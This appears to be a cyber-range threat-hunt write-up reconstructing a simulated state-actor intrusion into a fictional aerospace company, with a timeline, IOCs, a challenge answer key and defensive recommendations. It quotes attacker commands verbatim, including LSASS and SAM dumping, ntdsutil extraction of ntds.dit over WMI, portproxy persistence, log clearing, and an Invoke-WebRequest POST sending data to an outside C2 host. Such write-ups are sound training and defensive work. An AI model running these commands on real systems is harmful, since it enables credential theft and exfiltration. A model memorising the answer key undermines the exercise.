# Operation Silent Corridor — Incident Report & Hunt Writeup

**Challenge:** Operation Silent Corridor // Haldric Aerospace
**Platform:** LOG(N) Pacific Cyber Range (Skool / hunt.lognpacific.com)
**Analyst:** Rich Vincent (`d3tr0it_z3r0`)
**Date Completed:** 2026-05-09
**Data Source:** `SilentCorridorX_CL` (MDE-style telemetry + FortiGate VPN logs, 8,538 rows)
**Sentinel Workspace:** `LAW-SilentCorridor` — `94b3fda2-abe5-4af9-849a-a8b90d5c17ae` (subscription `cd015a7d-…`, RG `Cyber-Range-2-Admin-SOC`)
**Investigation Window:** 20 February — 5 March 2026
**Reporting Customer:** K. Hofmann (CISO, Haldric Aerospace) per BfV advisory on GREY VEIL

---

## Executive Summary

A state-sponsored threat actor designated **GREY VEIL** compromised the engineering segment of Haldric Aerospace via the corporate FortiGate SSL-VPN, achieving full domain compromise and exfiltration of classified avionics design material in a 13-day campaign. Initial access was obtained through credential brute-force from Tor exit node `185.220.101.34` against the engineering VPN account `s.brandt`. After landing on workstation `WS-ENG04`, the attacker performed extensive AD enumeration, attempted (and failed) an LSASS memory dump via the `comsvcs.dll/MiniDump` LOLBin technique, then successfully extracted the workstation's `SAM` hive — yielding the credential `m.richter:Haldric2025SecIT` for a privileged engineering admin account.

Using the stolen `m.richter` credential, GREY VEIL pivoted via WMI (`wmic /node:`) to both `SRV-DC01` (Domain Controller) and `SRV-FILES02` (engineering file server). On the DC they executed `ntdsutil "ac i ntds" ifm` to extract the entire `ntds.dit` Active Directory database from a VSS shadow copy, dropping the dump in a deceptively-named directory `C:\Windows\Temp\McAfee_Logs`. On the file server they collected the `C:\Engineering\Avionics\A400M_NavSys` directory tree (NATO A400M military transport navigation system design documents), packaged it via `Compress-Archive` into `win_update_kb5034.zip` masquerading as a Windows update, base64-encoded the archive with `certutil -encode`, and POSTed the result from `WS-ENG04` to attacker-controlled CDN `cdn-telemetry.cloud-endpoint.net`.

Persistence was established via Windows `netsh portproxy` rules on both `WS-ENG04` (relay 8443→`SRV-DC01`:445) and `SRV-DC01` (relay 9999→`WS-ENG04`:8443), stored at `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` — a Windows-native bidirectional tunnel that survives credential resets. Anti-forensics included `wevtutil cl Security` on all three compromised hosts and removal of the `McAfee_Logs` staging directory from the DC. **However, the attacker missed Sysmon/MDE telemetry** — the entire attack chain was reconstructed from the surviving `SilentCorridorX_CL` custom log table.

**Three hosts compromised, plus the VPN appliance:**

| Hostname | Role | OS | First touched |
|---|---|---|---|
| WS-ENG04 | Engineering workstation (`s.brandt` user) | Windows 10/11 | 2026-02-20 02:14 (VPN login) |
| SRV-FILES02 | Engineering file server (A400M_NavSys repository) | Windows Server | 2026-02-25 07:27 (network logon as `s.brandt`) |
| SRV-DC01 | Domain Controller (`haldric.local`) | Windows Server | 2026-02-28 03:15 (`net use \\SRV-DC01\C$ /user:m.richter`) |
| VPN-GW01 | FortiGate SSL-VPN gateway | FortiOS | 2026-02-19 23:47 (first failed login from Tor) |

---

## MITRE ATT&CK Kill Chain

| Phase | Technique | ID |
|---|---|---|
| Reconnaissance | Gather Victim Identity Information: Credentials | T1589.001 |
| Initial Access | Valid Accounts: Cloud / VPN | T1078.004 |
| Initial Access | Brute Force: Password Guessing (Tor-fronted) | T1110.001 |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 |
| Execution | Windows Management Instrumentation (`wmic /node:`) | T1047 |
| Execution | System Services: Service Execution (`ntdsutil`) | T1569.002 |
| Persistence | Network Service Discovery: Port Forward (`netsh portproxy`) | T1090.001 / T1572 |
| Privilege Escalation | Valid Accounts: Domain Account (`m.richter`) | T1078.002 |
| Defense Evasion | Indicator Removal: Clear Windows Event Logs (`wevtutil cl`) | T1070.001 |
| Defense Evasion | Indicator Removal: File Deletion (`rmdir /s /q McAfee_Logs`) | T1070.004 |
| Defense Evasion | Masquerading: Match Legitimate Name (`McAfee_Logs`, `win_update_kb5034.zip`) | T1036.005 |
| Defense Evasion | Hide Artifacts: NTFS File Attributes / VSS shadow misuse | T1564 |
| Credential Access | OS Credential Dumping: LSASS Memory (attempted, failed) | T1003.001 |
| Credential Access | OS Credential Dumping: Security Account Manager (`reg save HKLM\SAM`) | T1003.002 |
| Credential Access | OS Credential Dumping: NTDS (`ntdsutil ifm`) | T1003.003 |
| Credential Access | Credentials from Password Stores (`cmdkey /list`, PuTTY registry) | T1555 |
| Discovery | Account Discovery: Domain Account (`net group "Domain Admins"`) | T1087.002 |
| Discovery | Domain Trust Discovery (`net group "Enterprise Admins"`) | T1482 |
| Discovery | System Network Configuration Discovery (`ipconfig`, `arp`, `netstat`) | T1016 |
| Discovery | Remote System Discovery (DNS lookups for `SRV-DC01`, `SRV-FILES02`) | T1018 |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares (`net use \\…\C$`) | T1021.002 |
| Lateral Movement | Remote Services: Distributed Component Object Model (WMI `process call create`) | T1021.003 |
| Lateral Movement | Remote Services: Remote Desktop Protocol (`rdpclip` artifacts on SRV-FILES02) | T1021.001 |
| Collection | Archive Collected Data: Archive via Utility (`Compress-Archive`) | T1560.001 |
| Collection | Data from Network Shared Drive (A400M_NavSys via `\\SRV-FILES02\C$`) | T1039 |
| Command & Control | Application Layer Protocol: Web Protocols (HTTPS POST) | T1071.001 |
| Command & Control | Encrypted Channel: Asymmetric Cryptography (TLS to CDN) | T1573.002 |
| Exfiltration | Exfiltration Over C2 Channel (`Invoke-WebRequest -Method POST`) | T1041 |
| Exfiltration | Data Encoding: Standard Encoding (`certutil -encode` base64) | T1132.001 |

---

## Attack Timeline

All times UTC, sourced from the `EventTime` string field in `SilentCorridorX_CL` (NOT `TimeGenerated`, which is the Sentinel ingestion timestamp and is unreliable for sequencing).

### Phase 1 — Initial Access via VPN Brute Force (VPN-GW01 → WS-ENG04)

**User:** `s.brandt` (legitimate engineering employee whose VPN credentials were guessed/stolen)
**Source IP:** `185.220.101.34` (Tor exit node, `dannenberg.tor-exit.calyxinstitute.org`)

| Time | Event |
|---|---|
| 2026-02-19 23:47:12 | First `ssl-login-fail` from Tor for account `s.brandt` |
| 2026-02-20 02:14:00 | `ssl-login-succ` from same Tor IP → tunnel established to `WS-ENG04` |
| 2026-02-20 02:14:07 | `tunnel-up` assigned `TunnelIP=10.1.96.114` (attacker tunnel pool, distinct from legitimate user pool `10.20.10.x`) |

**Profile of legitimate vs attacker activity for `s.brandt`:**

| Source IP | Type | Notes |
|---|---|---|
| `88.153.72.14` | Legitimate (German residential ISP) | Daily-pattern VPN sessions Feb 17 onward, TunnelIP `10.20.10.101` |
| `185.220.101.34` | Attacker (Tor exit, Calyx Institute) | First fail Feb 19 23:47, first success Feb 20 02:14, TunnelIP `10.1.96.114` |
| `91.234.33.126` | Attacker (rotation IP) | Sessions Feb 25, Feb 28, also TunnelIP `10.1.96.114` |
| `45.153.160.88` | Attacker (rotation IP) | Sessions Mar 2 (exfil), Mar 4 (re-entry) |

The four distinct source IPs against a single account form the original anomaly signal — every legitimate user in the dataset had exactly one source IP.

### Phase 2 — Discovery on the Beachhead (WS-ENG04, `s.brandt` context)

| Time | Command | Purpose |
|---|---|---|
| 2026-02-20 02:14:00 | `systeminfo` | OS / patch level fingerprint |
| 2026-02-23 01:47:00 | `net group "Domain Admins" /dom` | Privileged group enumeration |
| 2026-02-23 01:47:48 | `net group "Enterprise Admins" /dom` | Forest-level admin enumeration |
| 2026-02-23 01:49:35 | `wmic logicaldisk get caption,filesystem,freespace,size,volumename` | Disk inventory (note typo `fileststem` in first attempt — manual operator, not script) |
| 2026-02-23 (DNS) | DNS queries for `SRV-DC01.haldric.local`, `SRV-DC01`, `SRV-FILES02`, `intranet.haldric.local` | Internal infrastructure mapping |

The first two DNS queries for `SRV-DC01` actually predate the breach (Feb 18-19, legitimate user activity). The post-Feb-20 queries from `WS-ENG04` are the attacker mapping the AD environment.

### Phase 3 — Credential Theft (WS-ENG04)

| Time | Command | Outcome |
|---|---|---|
| 2026-02-26 02:38:49 | `tasklist /fi "imagename eq lsass.exe"` | LSASS PID enumeration (PID 628) |
| 2026-02-26 02:40:03 | `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full` | **FAILED** — no `sys_diag.dmp` created, no `comsvcs.dll` DLL load logged, no Defender block event. Process started but produced no artifact. |
| 2026-02-26 02:42:55 | `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"` | PuTTY stored session enumeration (looking for cached SSH credentials) |
| 2026-02-27 11:04:16 | `cmdkey /list` | Windows Credential Manager enumeration |
| 2026-02-27 12:11:29 | `cmdkey /list` (again) | — |
| 2026-02-27 12:20:20 | `reg save HKLM\SAM C:\Windows\Temp\sam.bak` | **SUCCESS** — local SAM hive saved to disk |
| 2026-02-27 14:28:52 | `reg save HKLM\SAM C:\Windows\Temp\sam.bak` (again, overwrote first copy) | — |

**Evidence gap:** The actual mechanism by which `m.richter:Haldric2025SecIT` was extracted is not directly visible. The most likely path is offline cracking of the SAM hive (`sam.bak`) — `m.richter` had cached interactive logon credentials on `WS-ENG04` (engineering admin who occasionally remoted in), and the attacker pulled the hash from SAM/SECURITY then cracked offline between Feb 27 and Feb 28.

### Phase 4 — First Lateral Pivot to Domain Controller (WS-ENG04 → SRV-DC01)

**User context for the pivot:** `s.brandt` (running on WS-ENG04), but **acting as `m.richter`** via explicit credential.

| Time | Command | Notes |
|---|---|---|
| 2026-02-28 03:15:00 | `net use \\SRV-DC01\C$ /user:m.richter Haldric2025SecIT` | First lateral pivot. Credentials supplied **in plaintext on the command line** (visible in `ProcessCommandLine`). |
| 2026-02-28 03:15:00 | DeviceLogonEvent on SRV-DC01: `LogonType=3` (Network), `RemoteIP=10.1.70.42` (SRV-FILES02's IP) | Note: pivot RemoteIP attributes through SRV-FILES02 — attacker had transient access there earlier (Feb 25 07:27) and used it as an intermediate hop. |
| 2026-02-28 03:16:53 | `wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process call create "cmd.exe /c mkdir C:\Windows\Temp\McAfee_Logs & ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\McAfee_Logs\""` | **DC compromise via WMI.** Single line creates staging dir AND launches `ntdsutil` IFM. |

### Phase 5 — Domain Database Extraction (SRV-DC01)

`ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\McAfee_Logs"` is the canonical Microsoft-blessed method to extract `ntds.dit` from a running DC. It uses VSS to take a shadow copy and dumps the AD database + supporting registry hives.

| Time | Event | Notes |
|---|---|---|
| 2026-02-28 04:18:12 | `FileCreated C:\Windows\Temp\McAfee_Logs` (directory) | by `cmd.exe` (WMI-spawned) |
| 2026-02-28 04:18:28 | `ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs" q q` | Process spawn, `m.richter` context |
| 2026-02-28 04:20:00 | `vssadmin create shadow /for=C:` | VSS shadow copy of system drive |
| 2026-02-28 04:21:13 | `FileCreated C:\Windows\Temp\McAfee_Logs\ntds.dit` | First copy of AD database |
| 2026-02-28 04:21:37 | `FileCreated C:\Windows\Temp\McAfee_Logs\SYSTEM` | Boot key for ntds.dit decryption |
| 2026-02-28 04:21:52 | `ntds.dit` and `SYSTEM` re-accessed by `MsMpEng.exe` | **Defender scanned the dump files** (visible in `InitiatingProcessFileName=MsMpEng.exe`) — but did NOT block them. Policy gap. |
| 2026-02-28 04:22:10 | `FileCreated C:\Windows\Temp\McAfee_Logs\SECURITY` | SECURITY hive (cached domain credentials, secrets) |

**Anti-forensic naming:** The directory name `McAfee_Logs` is deceptive — Haldric does not use McAfee. An incautious responder looking at `C:\Windows\Temp\` would dismiss it as a security tool log directory.

### Phase 6 — File Server Lateral Movement & Collection (SRV-FILES02)

| Time | Event | Notes |
|---|---|---|
| 2026-02-25 07:27:33 | `s.brandt` LogonSuccess on SRV-FILES02, `LogonType=3`, `RemoteIP=10.1.36.210` | Earliest network logon to file server (pre-pivot reconnaissance via `s.brandt`'s legitimate access) |
| 2026-02-28 03:16:29 | RDP-session artifacts begin (`rdpclip.exe`, `TSTheme.exe -Embedding`) under `m.richter` context on SRV-FILES02 | Attacker established RDP session as m.richter |
| 2026-02-28 03:17:29 | `makecab C:\Engineering\Avionics\A400M_NavSys\Design\nav_integration_spec_v4.2.docx C:\Windows\Temp\nav_cache.cab` | Test of compression on a single sensitive file |
| 2026-02-28 03:18:59 | `powershell Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys\*' -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip' -Force` | **Full A400M NavSys directory archived.** Filename masquerades as Windows Update package KB5034. |
| 2026-02-28 03:19:37 | `certutil -encode C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64` | **Base64 encoding** for HTTP transit (binary `.zip` → text `.b64`). |
| 2026-02-28 03:25:37 | `cmd.exe /c del /f /q C:\Windows\Temp\nav_cache.cab C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64` | Cleanup on the file server (the `.b64` was first copied back to WS-ENG04 before deletion) |
| 2026-02-28 03:33:51 | `cmd.exe /c wevtutil cl Security` (via WmiPrvSE) | Security log clearing on SRV-FILES02 |

### Phase 7 — Persistence via Port Proxy

| Time | Host | Command | Effect |
|---|---|---|---|
| 2026-02-28 03:25:27 | WS-ENG04 | `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local` | Public-facing port 8443 on WS-ENG04 forwards to SRV-DC01:445 (SMB) |
| 2026-02-28 04:23:14 | SRV-DC01 | `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp` | DC port 9999 forwards back to WS-ENG04:8443 — **bidirectional tunnel** |

**Registry storage** (survives reboot, survives credential reset):
```
HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp
```
On WS-ENG04 the value is `SRV-DC01.haldric.local/445`; on SRV-DC01 the value is `10.1.36.210/8443`. This persistence channel cannot be broken by rotating `s.brandt` or `m.richter` credentials — it survives until the registry keys are explicitly deleted and the `iphlpsvc` service is restarted.

### Phase 8 — Exfiltration (Mar 2)

The attacker waited ~2 days after staging on SRV-FILES02 before transmitting (likely operational discipline — let any monitoring alerts age out before the noisy outbound).

| Time | Event |
|---|---|
| 2026-03-02 01:10:06 | New attacker tunnel-up from `45.153.160.88` to WS-ENG04 |
| 2026-03-02 01:19:15 | `powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing` |
| 2026-03-02 01:35:00 | tunnel-down |

**Note:** The exfil happened from `WS-ENG04`, not the file server where the data was staged. The `.b64` file was transferred from SRV-FILES02 to WS-ENG04 between Feb 28 03:25 and Mar 2 01:19 (likely via the netsh portproxy or via SMB). The exfil command was crafted to appear as a CDN telemetry POST — `cdn-telemetry.cloud-endpoint.net` is attacker-controlled.

### Phase 9 — Re-Entry & Anti-Forensics (Mar 3 — Mar 5)

| Time | Event |
|---|---|
| 2026-03-04 02:45:14 | `certutil -urlcache -split -f "https://cdn-telemetry.cloud-endpoint.net" C:\Windows\Temp\response.txt` (re-entry session, retrieving operator instructions from C2) |
| 2026-03-04 04:20:05 | New attacker tunnel-up from `45.153.160.88` |
| 2026-02-23 11:01:19 | `wevtutil cl Security` on WS-ENG04 (console-direct, not WMI — earlier than the lateral phase) |
| 2026-02-23 12:08:32 | `wevtutil cl Security` on WS-ENG04 (second console clear) |
| 2026-02-28 03:33:51 | `wevtutil cl Security` on SRV-FILES02 (WMI-launched) |
| 2026-02-28 04:46:24 | `wevtutil cl Security` on SRV-DC01 (WMI-launched) |
| 2026-02-28 04:45:49 | `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` on SRV-DC01 (staging directory removed) |

**The key anti-forensic gap they missed:** Log clearing only nukes the Windows Security/System event log channels. The `SilentCorridorX_CL` table is sourced from MDE/Sysmon-grade endpoint telemetry that ships off-host in real time — wevtutil `cl` does not retroactively delete what was already shipped.

---

## Evidence Inventory

### Artifacts on WS-ENG04 (Workstation, beachhead)

| Artifact | Path | Purpose |
|---|---|---|
| Local SAM dump | `C:\Windows\Temp\sam.bak` | SAM hive from `reg save HKLM\SAM` (Feb 27 12:20) — likely source of m.richter hash |
| Failed LSASS dump target | `C:\Windows\Temp\sys_diag.dmp` (NOT created, expected per command) | Failed `comsvcs.dll/MiniDump` attempt |
| Staged exfil archive (transit) | `C:\Windows\Temp\win_update_kb5034.b64` | Base64 of A400M NavSys archive, copied back from SRV-FILES02 for exfil |
| C2 response cache | `C:\Windows\Temp\response.txt` | `certutil -urlcache` output from cdn-telemetry C2 |
| PortProxy persistence | `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` (registry, value `SRV-DC01.haldric.local/445`) | Inbound 8443 → SRV-DC01:445 SMB relay |

### Artifacts on SRV-FILES02 (File Server, collection point)

| Artifact | Path | Purpose |
|---|---|---|
| Initial sensitive file test | `C:\Windows\Temp\nav_cache.cab` (deleted) | First `makecab` of A400M doc as proof-of-access |
| Compressed exfil archive | `C:\Windows\Temp\win_update_kb5034.zip` (deleted) | `Compress-Archive` of `C:\Engineering\Avionics\A400M_NavSys\*` |
| Base64-encoded exfil archive | `C:\Windows\Temp\win_update_kb5034.b64` (deleted) | `certutil -encode` output, transferred to WS-ENG04 for exfil |
| Source data | `C:\Engineering\Avionics\A400M_NavSys\` (intact, not deleted) | Original A400M military transport navigation system documents |

### Artifacts on SRV-DC01 (Domain Controller)

| Artifact | Path | Purpose |
|---|---|---|
| AD database staging | `C:\Windows\Temp\McAfee_Logs\ntds.dit` (deleted via `rmdir /s /q`) | Full AD database via `ntdsutil ifm` |
| Boot key | `C:\Windows\Temp\McAfee_Logs\SYSTEM` (deleted) | Required to decrypt ntds.dit offline |
| LSA secrets | `C:\Windows\Temp\McAfee_Logs\SECURITY` (deleted) | Cached domain credentials, service-account secrets |
| Removed VSS shadow | `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*` | Shadow copy used for `ntds.dit` extraction |
| PortProxy persistence | `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` (registry, value `10.1.36.210/8443`) | Outbound 9999 → WS-ENG04:8443 relay (back-channel from internal DC outward) |

### Network Indicators of Compromise

| Indicator | Type | Purpose |
|---|---|---|
| `185.220.101.34` | Source IP — Tor exit | First-touch brute force, intermittent attacker sessions |
| `91.234.33.126` | Source IP — VPS rotation | Attacker tunnel sessions Feb 25, Feb 28 |
| `45.153.160.88` | Source IP — VPS rotation | Attacker tunnel sessions Mar 2 (exfil), Mar 4 (re-entry) |
| `cdn-telemetry.cloud-endpoint.net` | C2 / exfil domain | HTTPS POST destination for base64 archive; `certutil -urlcache` source for re-entry |
| `10.1.96.114` | Internal tunnel IP | Attacker SSL-VPN tunnel pool assignment (clean separation from legit-user pool `10.20.10.x`) |

### Compromised Credentials

| Account | Source | Privilege | Notes |
|---|---|---|---|
| `s.brandt` | VPN brute-force from Tor | Engineering user (VPN access) | Initial access; password not exposed in plaintext but the account was used freely after Feb 20 02:14 |
| `m.richter` / `Haldric2025SecIT` | Likely from offline crack of `sam.bak` | Engineering admin (local administrator on WS-ENG04, plus AD privileges sufficient for WMI to SRV-DC01 + SRV-FILES02) | **Plaintext exposed in `ProcessCommandLine` at 2026-02-28 03:15:00** (`net use \\SRV-DC01\C$ /user:m.richter Haldric2025SecIT`) — once captured by EDR/Sysmon, credential was visible to defenders too. |
| All AD accounts (via ntds.dit) | `ntdsutil ifm` extraction Feb 28 04:21 | Forest-wide | Every domain account hash is now offline-crackable. Assume full domain compromise. |
| LSA cached secrets (via SECURITY hive) | Same extraction | Service accounts, cached domain admin sessions on the DC | Credentials with broad AD privileges are likely included. |

---

## Answers Reference (Q00 — Q37)

All 38 LIVE flags solved on 2026-05-09. Solve timestamps from `/api/v1/users/me/solves`.

| Q# | Topic | Answer | Solve time UTC |
|---|---|---|---|
| Q00 | Custom log table | `SilentCorridorX_CL` | 14:16:16 |
| Q01 | Suspicious account | `s.brandt` | 14:17:53 |
| Q02 | Origin of failed auth | `185.220.101.34` | 14:19:34 |
| Q03 | Distinct source IPs for s.brandt | `4` | 14:20:10 |
| Q04 | Source address inventory | `45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34` | 14:20:50 |
| Q05 | Internal landing point | `WS-ENG04` | 14:21:17 |
| Q06 | Initial process / parent | `systeminfo.exe/cmd.exe` | 14:22:04 |
| Q07 | Directory enumeration | `Domain Admins, Enterprise Admins` | 14:23:05 |
| Q08 | Network reconnaissance targets | `SRV-DC01, SRV-FILES02` | 14:24:15 |
| Q09 | First credential activity | `tasklist /fi "imagename eq lsass.exe"` | 14:26:43 |
| Q10 | Credential dump outcome | `NO/none` (rundll32 ran but no .dmp file produced, no intervening process) | 14:30:09 |
| Q11 | Stored credential source | `SAM` | 14:31:19 |
| Q12 | Saved credentials enumeration | `cmdkey /list` | 14:32:09 |
| Q13 | First lateral pivot | `10.1.96.114/SRV-DC01/m.richter` | 14:36:01 |
| Q14 | New account observed | `m.richter` | 14:36:54 |
| Q15 | Cross-host spawning tool | `wmic` | 14:37:35 |
| Q16 | New filesystem activity dir | `C:\Windows\Temp\McAfee_Logs` | 14:38:06 |
| Q17 | Critical file / responsible user | `ntds.dit/m.richter` | 14:38:48 |
| Q18 | Concurrent file access process | `MsMpEng.exe` | 14:39:29 |
| Q19 | Database file access tool | `ntdsutil` | 14:39:52 |
| Q20 | Spawning source | `WmiPrvSE.exe/WS-ENG04` | 14:40:47 |
| Q21 | RDP scope (hosts on tunnel) | `SRV-DC01, SRV-FILES02, WS-ENG04` | 14:42:01 |
| Q22 | Network configuration change | `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local` | 14:42:40 |
| Q23 | Configuration storage | `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` | 14:43:19 |
| Q24 | Matching DC configuration | `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp` | 14:43:45 |
| Q25 | Targeted directory | `C:\Engineering\Avionics\A400M_NavSys` | 14:44:05 |
| Q26 | Packaged output | `win_update_kb5034.zip` | 14:44:23 |
| Q27 | Compression cmdlet | `Compress-Archive` | 14:44:42 |
| Q28 | Format conversion tool | `certutil` | 14:45:00 |
| Q29 | Outbound transfer command | `powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing` | 14:45:56 |
| Q30 | External destination | `cdn-telemetry.cloud-endpoint.net` | 14:46:14 |
| Q31 | Re-entry window (days) | `2` | 14:47:33 |
| Q32 | First cleanup action | `wevtutil cl Security` | 14:48:33 |
| Q33 | Clearing method (console / remote) | `WS-ENG04/SRV-DC01, SRV-FILES02` | 14:49:31 |
| Q34 | Surviving log source | `Sysmon` | 14:50:24 |
| Q35 | Exfiltration confidence call | `HIGH. Engineering files in C:\Engineering\Avionics\A400M_NavSys were collected on SRV-FILES02 and packaged with Compress-Archive into win_update_kb5034.zip, then base64-encoded by certutil to win_update_kb5034.b64, and finally POSTed via PowerShell Invoke-WebRequest from WS-ENG04 to cdn-telemetry.cloud-endpoint.net. The full chain is proven end-to-end in the telemetry that survived the wevtutil log clears.` | 14:51:13 |
| Q36 | DC staging cleanup | `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` | 14:51:40 |
| Q37 | CISO Brief | (See "CISO Brief" section below) | 14:52:23 |

---

## CISO Brief (Q37, full text)

> GREY VEIL compromised the s.brandt VPN account via password attack from Tor exit `185.220.101.34` and landed on `WS-ENG04`, then dumped credentials including `m.richter`, which they reused over WMI to pivot to `SRV-DC01` and `SRV-FILES02`. They exfiltrated the A400M_NavSys engineering files and the `ntds.dit` AD database by staging on SRV-FILES02, packaging via `Compress-Archive` and `certutil` base64 encoding, and POSTing the `.b64` from WS-ENG04 to `cdn-telemetry.cloud-endpoint.net`. Persistence survives credential resets via `netsh interface portproxy` entries written to `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` on both WS-ENG04 and SRV-DC01. Immediate containment: disable s.brandt and m.richter, force enterprise-wide AD password reset (krbtgt twice), remove the PortProxy registry keys and netsh portproxy rules from WS-ENG04 and SRV-DC01, block `cdn-telemetry.cloud-endpoint.net` at the perimeter, and isolate all three hosts for forensic imaging.

---

## Evidence Gaps & Limitations

1. **Mechanism of m.richter password extraction (Feb 27 — Feb 28 gap):** The LSASS dump attempt failed (no `.dmp` file produced). The actor saved `HKLM\SAM` and ran `cmdkey /list`, but the actual password-to-plaintext step is not visible in the dataset. Most likely path: offline cracking of the SAM hive between Feb 27 14:28 and Feb 28 03:15. Alternative: cached domain credentials in the `SECURITY` hive (which they would have also pulled with `reg save HKLM\SECURITY`, an event we don't see — so likely they only got `SAM`).
2. **Exfil archive transit between hosts:** The `.b64` file was created on SRV-FILES02 (Feb 28 03:19) and uploaded from WS-ENG04 (Mar 2 01:19), but the cross-host file transfer event isn't captured (likely SMB to `\\WS-ENG04\C$` or via the established netsh portproxy).
3. **Windows Security / System log clearing on all 3 hosts** removes 4624/4625/4720/4732/4768/4769/4776 visibility. Only `DeviceLogonEvents` from MDE survived.
4. **Defender behavior on the dump files:** `MsMpEng.exe` accessed `ntds.dit` and `SYSTEM` files on SRV-DC01 (Feb 28 04:21:52) — Defender SAW the dump but did not block. Likely policy gap (passive monitoring not active blocking, or the file extension `.dit` was not classified as a sensitive type). Q34's "log source missed" answer (`Sysmon`) is the silver lining: Defender's MDE telemetry channel survived even where its blocking policy didn't act.
5. **VPN gateway logs lack tunnel-IP-to-RemoteIP mapping post-disconnect:** When the attacker's tunnel ended Feb 23 02:08, subsequent activity from `WS-ENG04` toward internal hosts couldn't be cleanly attributed to the attacker tunnel (10.1.96.114) without inferring from process timestamps. We addressed this by treating any post-Feb-19-23:47 attacker-IP tunnel as part of the campaign.

---

## Recommendations

### Immediate (Incident Response)

1. **Disable `s.brandt` and `m.richter`** AD accounts. Force password reset for any account that authenticated via VPN since 2026-02-19.
2. **Reset KRBTGT account twice** (24-hour gap) to invalidate any forged Kerberos tickets minted against the stolen ntds.dit hashes.
3. **Force enterprise-wide AD password rotation.** The full ntds.dit was exfiltrated; every account hash is offline-crackable.
4. **Remove PortProxy persistence** — on both `WS-ENG04` and `SRV-DC01`:
   ```
   netsh interface portproxy reset
   reg delete "HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp" /f
   net stop iphlpsvc && net start iphlpsvc
   ```
5. **Block at perimeter:** `cdn-telemetry.cloud-endpoint.net` (DNS sinkhole + firewall block), source IPs `185.220.101.34`, `91.234.33.126`, `45.153.160.88`.
6. **Isolate `WS-ENG04`, `SRV-DC01`, `SRV-FILES02`** for forensic imaging. Do not power off — preserve memory if possible.
7. **VPN policy hardening:** Require MFA on the FortiGate SSL-VPN. Block known Tor exit nodes at the VPN gateway (Tor Project publishes the list).
8. **Review and revoke** any AD privileged group memberships that depend on accounts present in the stolen ntds.dit. Re-issue smart-card / certificate-based credentials for tier-0 accounts.

### Detection Improvements

1. **Alert on `wevtutil cl`** anywhere — no legitimate admin clears Security/System logs in normal operations.
2. **Alert on `netsh interface portproxy add`** — extremely uncommon legitimate use; near-100% true positive for adversary tradecraft.
3. **Alert on `ntdsutil ... ifm "create full"`** — used only for IFM media creation (rare scheduled event); spurious use is a near-certain DC compromise signal.
4. **Alert on `reg save HKLM\SAM` / `reg save HKLM\SECURITY` / `reg save HKLM\SYSTEM`** — credential dumping signature.
5. **Alert on `wmic /node:` with `/user:` and `/password:` flags** — credentials in command line indicate lateral movement.
6. **Alert on `certutil -encode` or `certutil -decode`** on file server endpoints — common LOLBin for binary↔text conversion in exfil pipelines.
7. **Alert on `Compress-Archive` followed by base64 encoding within 5 minutes** — exfil staging signature.
8. **Alert on multiple distinct source IPs for the same VPN account within 7 days** — the original "one IP per user" anomaly that gave away `s.brandt`.
9. **Alert on `tasklist /fi "imagename eq lsass.exe"`** — rare benign use, almost always a credential-dump precursor.
10. **Alert on directory creation under `C:\Windows\Temp\` with names matching common security-tool patterns** (`McAfee_Logs`, `Defender_Cache`, `Symantec`, `CrowdStrike` etc.) when not preceded by an installation event.

### Hardening

1. **Enforce MFA on FortiGate SSL-VPN.** Single-factor VPN with long-lived passwords is the root failure mode here.
2. **Geo-fence VPN access.** Haldric employees are predominantly German residents — block all non-EU source IPs at the VPN gateway, with explicit allowlist for travel exceptions.
3. **Tor exit node blocking** at the VPN appliance, refreshed daily from `https://check.torproject.org/exit-addresses`.
4. **Disable WMI-based remote process execution** for non-admin accounts via `wbemtest` or GPO. `m.richter` should not have been able to `wmic /node:SRV-DC01 process call create` from an engineering workstation.
5. **Enable Credential Guard** on all workstations and servers — prevents most LSASS dump techniques regardless of admin rights.
6. **Disable cached interactive logons** for privileged accounts (`m.richter`) on shared workstations — eliminates the SAM hive as a credential source.
7. **Deploy LAPS** (Local Administrator Password Solution) so workstation-local admin passwords are unique and rotated. The shared `m.richter` password being the same on `WS-ENG04` and the AD account was the direct enabler of lateral movement.
8. **Enable Protected Users group** for all tier-0 accounts (DA, EA, schema admins). Prevents NTLM, prevents credential delegation, prevents cached credentials.
9. **Restrict `ntdsutil` execution** to a small set of explicitly authorized DC admin accounts via WDAC application allowlist.
